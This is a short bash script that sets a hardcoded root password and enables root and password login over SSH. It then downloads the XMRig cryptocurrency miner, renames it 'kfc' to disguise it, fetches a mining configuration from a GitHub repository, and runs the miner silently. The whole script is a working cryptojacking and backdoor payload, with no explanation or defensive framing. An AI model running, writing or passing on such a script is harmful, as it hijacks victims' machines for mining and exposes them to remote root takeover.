#!/bin/bash
echo root:NP1215GP55*3*com | sudo chpasswd root
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo service sshd restart
sudo wget -o- https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz
tar -xf /root/xmrig.tar.gz -C /root
mv xmrig kfc
chmod u+x ./kfc
sudo wget -o- https://raw.githubusercontent.com/corasuen511/maosj/refs/heads/main/xs.json
chmod u+x ./xs.json
./kfc --config=./xs.json >/dev/null 2>&1
ping aws.amazon.com
